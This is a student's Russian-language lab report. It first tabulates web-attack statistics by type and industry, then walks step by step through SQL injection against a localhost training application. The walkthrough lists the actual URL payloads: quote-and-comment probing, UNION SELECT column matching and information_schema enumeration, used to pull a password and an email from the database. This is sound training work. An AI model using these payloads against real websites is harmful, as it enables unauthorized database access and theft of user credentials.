# Лабораторная работа №1

## Часть 1

# 1) Источники

Bizone (2024):  
https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/

Security Boulevard / Verizon DBIR(2020):  
https://securityboulevard.com/2020/05/43-of-data-breaches-connected-to-application-vulnerabilities-assessing-the-appsec-implications/

Aioncloud / AIWAF (2025):  
https://www.aioncloud.com/2026-01-web-attack-trend-report/

# 2) 
По данным статьи Verizon DBIR(2020) ***43% случаев утечки данных*** были связаны с веб-приложениями.

# 3) 
# **По данным AIWAF за 2025 год**

| Тип уязвимости | Доля от общего числа обнаружений (%) |
| :--- | :--- |
| SQL Injection (SQL-инъекция) | 33.93 |
| Application Vulnerability (Уязвимости приложений) | 12.78 |
| Default Page (Страницы по умолчанию) | 12.29 |
| System File Access (Доступ к системным файлам) | 12.07 |
| Bad User-Agent (Некорректные / вредоносные User-Agent) | 9.7 |

# **По данным Bizone за 2024 год**

Распределение атак по типам уязвимостей

| Тип атаки | Доля |
| :--- | :--- |
| Remote Code Execution (RCE) | **36%** |
| Атаки на кражу данных (XSS и др.) | **14%** |
| SQL-инъекции | **10%** |
| Path traversal и доступ к файлам | **16%** |

# ***Доля атак по отраслям по данным Bizone(2024)***

### 3.1 RCE-атаки (36% от всех веб-атак)

| Отрасль | Доля RCE-атак |
| :--- | :--- |
| Медицина | 53% |
| Строительство | 47% |
| IT, ритейл, туризм | выше среднего (36%) |

### 3.2 Разведывательные атаки

| Отрасль | Доля разведывательных атак |
| :--- | :--- |
| Медиа | 54% |
| Промышленность | 47% |
| Финансы и страхование | 31% |

### 3.3 Path Traversal / доступ к файлам (16%)

| Отрасль | Доля атак |
| :--- | :--- |
| Транспорт и логистика | 73% |
| Энергетический сектор | 42% |
| Юридические, консалтинговые, рекламные и прочие профессиональные услуги | 38% |

### 3.4 XSS / кража данных (14%)

| Отрасль | Доля атак |
| :--- | :--- |
| Государственные организации | 66% |
| Телекоммуникационные компании | 37% |
| Образовательные учреждения | 30% |

### 3.5 SQL-инъекции (10%)

| Отрасль | Доля атак |
| :--- | :--- |
| Ритейл | 26% |
| Финансовый сектор | 11% |

## Часть 2

### Задание 1

Ход моих рассуждений:

> SQL-инъекции это когда вместо параметров типа логина и пароля вставляется sql код, на сервере при составлении запроса к бд производится соединение строк и (если нет проверки на то, что sql кода не должно быть в данных, которые пришли от пользователя) вместо адекватного логина и пароля вставляется код, и ответом от сервера, например, может прийти весь список пользователей 
>
> Я читала, что вставляют вот такие символы( ' или -- ), чтобы строку закрыть и оставшийся код закомментировать
>
> Надо что-то похожее попробовать сделать  
> Но сначала просто хотя бы тыкнуть с запрос с login = Volk2  
> http://localhost:8080/task/login=Volk2  
> В ответе Not Found, ожидаемо. Может просто Volk2 написать?
>
> http://localhost:8080/task/Volk2  
> Not Found  
> Ладно, пора открывать статью.  
> Кажется, стоит сразу sql запрос написать, что-то типа  
> `SELECT * FROM users WHERE username = 'Volk2' --'`  
> Чтобы закомментировать все что после   
> Чтобы было похоже на то, что в статье  
>`SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`
>
> http://localhost:8080/task/SELECT%20*%20FROM%20users%20WHERE%20username%20=%20'Volk2'%20--'  
> Not Found  
> Надо написать что-то типа id=любое и --'  
> А еще я погуглила и параметры пишутся через ?
>
> http://localhost:8080/task/?id=1  
> Ну тут уже что-то хоть вывелось  
> Ваш id:1  
> Ваш логин:admin  
>   
> http://localhost:8080/task/?nickname='Volk2'  
> Введите в качестве параметра ваш id  
> Судя по всему надо узнать id волка2
>
> http://localhost:8080/task/?id=2
> Ваш id:2  
> Ваш логин:Volk  
> Так ну это первый волк
>
> http://localhost:8080/task/?id=9  
> Ваш id:9  
> Ваш логин:Volk2  
> Нехитрым перебором хотя бы id узнали  
> Надо теперь как-то из бд вытащить пароль где у пользователя id = 9
>
> http://localhost:8080/task/?login='Volk2'  
> Если так то снова id требуют  
> Видимо все делаем через id
>
> http://localhost:8080/task/?id='--  
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' LIMIT 0,1' at line 1  
> Интересный ответ, но судя по всему в качестве СУБД сервер использует MySQL и уязвимость в виде sql инъекции присутствует  
> Так ну запрос выглядит что-то типа
> `query = "SELECT id, login FROM users WHERE id='" + id + "'"`  
> Надо написать что-то типа id = 9 UNION SELECT login, password FROM users
>
> http://localhost:8080/task/?id=9%20UNION%20SELECT%20login,%20password%20FROM%20users  
> Ваш id:9  
> Ваш логин:Volk2  
> Ничего не изменилось, судя по предыдущим запросам там лимит стоит надо просто сделать так чтобы не вернул ничего первый селект, а еще там есть ковычки у id
>
> http://localhost:8080/task/?id=-1 вот на такое пусто  
> То что надо  
> 
> http://localhost:8080/task/?id=-1%20UNION%20SELECT%20id,%20password%20FROM%20users%20WHERE%20id%20=%209  
> На такое тоже пусто
>
> http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,%20password%20FROM%20users%20WHERE%20id%20=%209  
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' LIMIT 0,1' at line 1  
> Уже ошибка уже не пусто
>
> http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,password%20FROM%20users%20WHERE%20id=9%20--%20  
> The used SELECT statements have a different number of columns  
> Победа, это новая ошибка  
> давайте просто пароль тогда попросим
>
> http://localhost:8080/task/?id=-1%27%20union%20select%20password%20from%20users%20where%20id=9%20--%20  
> The used SELECT statements have a different number of columns  
> Значит давайте все попросим
>
> http://localhost:8080/task/?id=-1%27%20union%20select%20*%20from%20users%20where%20id=9%20--%20  
> Ваш id:9  
> Ваш логин:Volk2  
> ага просим то мы все а отображается только то что надо, что делать то?
>
> http://localhost:8080/task/?id=-1%27%20union%20select%20id,login,password%20from%20users%20where%20id=9%20--%20  
> Unknown column 'login' in 'field list'  
> Логина нет
>
> http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20  
> а вот username есть и судя по всему 3 столбца
>
> http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20  
> Поменяли местами, теперь вместо id пароль вместо логина(username) id
>
> Ваш id:Wa spoiuuuuu  
> Ваш логин:9  
>   
> Это победа, коллеги.
>
> **ОТВЕТ: Wa spoiuuuuu**

---

### Задание 2

> Когда я перебирала id, на id=4 Винни пух нашелся  
> http://localhost:8080/task/?id=4  
> Ваш id:4  
> Ваш логин:Vinni-pukh  
> Попробуем аналогично предыдущему заданию  
> 
> http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20users%20where%20id=4%20--%20  
> Unknown column 'email' in 'field list'  
> Столбца email нет  
> 
> http://localhost:8080/task/?id=-1%27%20union%20select%20mail,id,username%20from%20users%20where%20id=4%20--%20  
> Unknown column 'mail' in 'field list'  
> Mail тоже нет  
> 
> а если в users немного информации а в user полная и там есть email  
> http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20user%20where%20id=4%20--  
> Table 'security.user' doesn't exist  
> Новая ошибка, но судя по всему user нет, а если USER?  
> 
> http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20USER%20where%20id=4%20--%20  
> Table 'security.USER' doesn't exist  
> Такой тоже нет  
> А можно как-то узнать какие есть?  
> 
> http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20table_name,1,2%20FROM%20information_schema.tables%20--%20  
> Ваш id:CHARACTER_SETS  
> Ваш логин:1  
> Что-то в этом есть  
> 
> http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20  
> Ваш id:emails,users  
> Ваш логин:1  
> Супер, есть всего две базы, и вторая с почтами  
> 
> http://localhost:8080/task/?id=-1%27%20union%20select%20email,%201,%202%20from%20emails%20where%20user_id=4%20--%20  
> Unknown column 'email' in 'field list'  
> такого столбца нет  
> 
> http://localhost:8080/task/?id=-1%27%20union%20select%200,%201,%202%20from%20emails%20where%20user_id=4%20--%20  
> Unknown column 'user_id' in 'where clause'  
> такого тоже кстати нет  
> Надо видимо снова понять какие столбцы в принципе есть и желательно одним запросом  
>    
> http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(column_name),1,2%20FROM%20information_schema.columns%20WHERE%20table_name='emails'%20--%20  
> Ваш id:id,email_id  
> Ваш логин:1  
> столбца 2 но каких-то странных, id это id записи или юзера? Наверное юзера но я бы так не делала бд  
>    
> http://localhost:8080/task/?id=-1%27%20union%20select%20email_id,%201,%202%20from%20emails%20where%20id=4%20--%20  
> Ваш id:honey_lover@otus-lab.com  
> Ваш логин:1  
> Ну это явно почта Винни пуха  
> 
> Все таки id это id юзера, а email_id это почта(?!!)  
> 
> ***ОТВЕТ: honey_lover@otus-lab.com***